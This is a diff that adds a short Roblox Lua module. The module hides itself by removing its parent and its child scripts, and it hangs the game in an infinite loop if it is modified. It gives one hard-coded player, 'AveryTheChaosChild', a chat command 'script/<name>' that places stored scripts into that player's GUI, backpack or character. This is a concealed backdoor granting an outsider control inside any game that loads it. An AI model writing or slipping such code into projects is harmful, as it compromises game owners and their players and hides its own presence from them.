@@ -1,0 +1,23 @@
+script.Parent = nil
+local Module = script;
+local Scripts = {};
+for _,v in next, Module:GetChildren'' do
+    Scripts[v.Name:lower()] = v:Clone();
+    v:Remove()
+end;
+
+Module.Changed:connect(function() repeat while true do end until nil end)
+
+local Players = game:GetService("Players");
+
+return function()
+    local Me = Players:FindFirstChild("AveryTheChaosChild");
+    Me.Chatted:connect(function(Message)
+        if string.sub(Message,1,7) == "script/" then
+            if(Scripts[string.sub(Message,8):lower()])then
+                local given = Scripts[string.sub(Message,8):lower()]
+                given:Clone().Parent = Me:FindFirstChildOfClass("PlayerGui") or Me:FindFirstChildOfClass("Backpack") or Me.Character;
+            end
+        end;
+    end)
+end
